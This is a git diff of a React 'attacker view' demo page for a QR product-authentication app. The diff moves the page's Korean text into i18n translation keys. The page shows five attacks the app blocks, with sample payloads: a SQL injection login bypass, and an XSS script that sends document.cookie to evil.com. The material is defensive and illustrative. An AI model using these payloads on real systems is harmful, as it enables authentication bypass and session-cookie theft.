@@ -1,48 +1,6 @@
 import React, { useState } from 'react';
 import { Link } from 'react-router-dom';
-
-const ATTACKS = [
-  {
-    title: 'SQL Injection',
-    icon: '🗡️',
-    desc: '로그인 폼에 SQL 조작 코드를 입력해 인증을 우회하려는 시도',
-    payload: `POST /api/auth/login\n{\n  "email": "admin' OR '1'='1 --",\n  "password": "anything"\n}`,
-    result: '❌ 차단 — SQLI_ATTEMPT 로그 기록, 로그인 거부',
-    color: 'orange'
-  },
-  {
-    title: 'BruteForce',
-    icon: '🔨',
-    desc: '비밀번호를 맞출 때까지 자동으로 반복 로그인 시도',
-    payload: `5회 연속 잘못된 비밀번호 입력\nPOST /api/auth/login × 5회`,
-    result: '❌ 차단 — 60초 계정 잠금, BRUTE_FORCE_LOCK 기록',
-    color: 'yellow'
-  },
-  {
-    title: 'XSS (Cross-Site Scripting)',
-    icon: '💀',
-    desc: '상품 설명에 악성 스크립트를 삽입해 다른 사용자를 공격',
-    payload: `상품 description:\n<script>fetch('//evil.com?c='+document.cookie)</script>`,
-    result: '❌ 차단 — sanitize-html 정제, XSS_ATTEMPT 로그 기록',
-    color: 'red'
-  },
-  {
-    title: 'IDOR (Insecure Direct Object Reference)',
-    icon: '🚪',
-    desc: '다른 상인의 상품 ID를 직접 입력해 수정·삭제 시도',
-    payload: `PUT /api/products/1\nAuthorization: Bearer <attacker_token>`,
-    result: '❌ 차단 — 403 Forbidden, IDOR_ATTEMPT 로그 기록',
-    color: 'purple'
-  },
-  {
-    title: '위조 QR',
-    icon: '🎭',
-    desc: 'QR 토큰을 위조하거나 조작해 가짜 상품 페이지 노출 시도',
-    payload: `GET /product/1?token=FAKE_TOKEN_12345`,
-    result: '❌ 차단 — 위험 페이지 표시, FAKE_QR_ACCESS 로그 기록',
-    color: 'cyan'
-  },
-];
+import { useTranslation } from 'react-i18next';
 
 const colorMap = {
   orange: { badge: 'bg-orange-900/40 border-orange-700/50 text-orange-400', code: 'text-orange-300' },
@@ -53,20 +11,64 @@ const colorMap = {
 };
 
 export default function AttackerView() {
+  const { t } = useTranslation();
   const [selected, setSelected] = useState(null);
+
+  const ATTACKS = [
+    {
+      titleKey: 'attacker.sqliTitle',
+      icon: '🗡️',
+      descKey: 'attacker.sqliDesc',
+      payload: `POST /api/auth/login\n{\n  "email": "admin' OR '1'='1 --",\n  "password": "anything"\n}`,
+      resultKey: 'attacker.sqliResult',
+      color: 'orange'
+    },
+    {
+      titleKey: 'attacker.bruteTitle',
+      icon: '🔨',
+      descKey: 'attacker.bruteDesc',
+      payloadKey: 'attacker.brutePayload',
+      resultKey: 'attacker.bruteResult',
+      color: 'yellow'
+    },
+    {
+      titleKey: 'attacker.xssTitle',
+      icon: '💀',
+      descKey: 'attacker.xssDesc',
+      payload: `상품 description:\n<script>fetch('//evil.com?c='+document.cookie)</script>`,
+      resultKey: 'attacker.xssResult',
+      color: 'red'
+    },
+    {
+      titleKey: 'attacker.idorTitle',
+      icon: '🚪',
+      descKey: 'attacker.idorDesc',
+      payload: `PUT /api/products/1\nAuthorization: Bearer <attacker_token>`,
+      resultKey: 'attacker.idorResult',
+      color: 'purple'
+    },
+    {
+      titleKey: 'attacker.fakeqrTitle',
+      icon: '🎭',
+      descKey: 'attacker.fakeqrDesc',
+      payload: `GET /product/1?token=FAKE_TOKEN_12345`,
+      resultKey: 'attacker.fakeqrResult',
+      color: 'cyan'
+    },
+  ];
 
   return (
     <div className="max-w-4xl mx-auto px-4 py-8">
       <div className="mb-6">
-        <Link to="/" className="text-zinc-500 hover:text-zinc-300 text-sm">← 홈으로</Link>
+        <Link to="/" className="text-zinc-500 hover:text-zinc-300 text-sm">{t('attacker.backHome')}</Link>
       </div>
 
       <div className="text-center mb-10">
         <div className="text-5xl mb-4">☠️</div>
-        <h1 className="text-3xl font-bold text-zinc-100 mb-2">공격자 시점</h1>
-        <p className="text-zinc-400">대충실드 QR이 방어하는 5가지 공격 패턴을 공격자 관점에서 확인합니다</p>
+        <h1 className="text-3xl font-bold text-zinc-100 mb-2">{t('attacker.title')}</h1>
+        <p className="text-zinc-400">{t('attacker.subtitle')}</p>
         <div className="mt-4 inline-flex items-center gap-2 bg-red-950/40 border border-red-800/50 rounded-full px-4 py-1.5 text-red-400 text-sm">
-          🚨 이 페이지는 발표 시연용입니다 — 모든 공격은 차단됩니다
+          {t('attacker.disclaimer')}
         </div>
       </div>
 
@@ -82,17 +84,19 @@ export default function AttackerView() {
               <div className="flex items-start gap-3">
                 <span className="text-3xl">{a.icon}</span>
                 <div className="flex-1">
-                  <h3 className="font-bold text-zinc-100 mb-1">{a.title}</h3>
-                  <p className="text-sm text-zinc-500">{a.desc}</p>
+                  <h3 className="font-bold text-zinc-100 mb-1">{t(a.titleKey)}</h3>
+                  <p className="text-sm text-zinc-500">{t(a.descKey)}</p>
                   {selected === i && (
                     <div className="mt-4 space-y-3">
                       <div>
-                        <p className="text-xs text-zinc-500 mb-1 uppercase tracking-wider">공격 시도</p>
-                        <pre className={`text-xs font-mono whitespace-pre-wrap bg-zinc-800 rounded p-3 ${c.code}`}>{a.payload}</pre>
+                        <p className="text-xs text-zinc-500 mb-1 uppercase tracking-wider">{t('attacker.attackLabel')}</p>
+                        <pre className={`text-xs font-mono whitespace-pre-wrap bg-zinc-800 rounded p-3 ${c.code}`}>
+                          {a.payloadKey ? t(a.payloadKey) : a.payload}
+                        </pre>
                       </div>
                       <div>
-                        <p className="text-xs text-zinc-500 mb-1 uppercase tracking-wider">결과</p>
-                        <div className={`text-sm font-semibold border rounded-lg px-3 py-2 ${c.badge}`}>{a.result}</div>
+                        <p className="text-xs text-zinc-500 mb-1 uppercase tracking-wider">{t('attacker.resultLabel')}</p>
+                        <div className={`text-sm font-semibold border rounded-lg px-3 py-2 ${c.badge}`}>{t(a.resultKey)}</div>
                       </div>
                     </div>
                   )}
@@ -105,8 +109,8 @@ export default function AttackerView() {
 
       {/* Try fake QR */}
       <div className="card border-red-700/30">
-        <h3 className="font-semibold text-zinc-300 mb-2">🎭 위조 QR 직접 체험</h3>
-        <p className="text-sm text-zinc-500 mb-4">아래 링크는 위조된 토큰을 포함한 QR URL입니다. 클릭하면 위험 페이지가 표시됩니다.</p>
+        <h3 className="font-semibold text-zinc-300 mb-2">{t('attacker.fakeQrTitle')}</h3>
+        <p className="text-sm text-zinc-500 mb-4">{t('attacker.fakeQrDesc')}</p>
         <a
           href="/product/1?token=FAKE_TOKEN_12345"
           target="_blank"
@@ -115,11 +119,11 @@ export default function AttackerView() {
         >
           http://localhost:5173/product/1?token=FAKE_TOKEN_12345
         </a>
-        <p className="text-xs text-zinc-600 mt-2">→ 이 접근은 관리자 대시보드에 FAKE_QR_ACCESS로 기록됩니다</p>
+        <p className="text-xs text-zinc-600 mt-2">{t('attacker.fakeQrNote')}</p>
       </div>
 
       <div className="text-center mt-8">
-        <Link to="/admin" className="btn-primary">🛡️ 관리자 대시보드에서 탐지 확인</Link>
+        <Link to="/admin" className="btn-primary">{t('attacker.goAdmin')}</Link>
       </div>
     </div>
   );
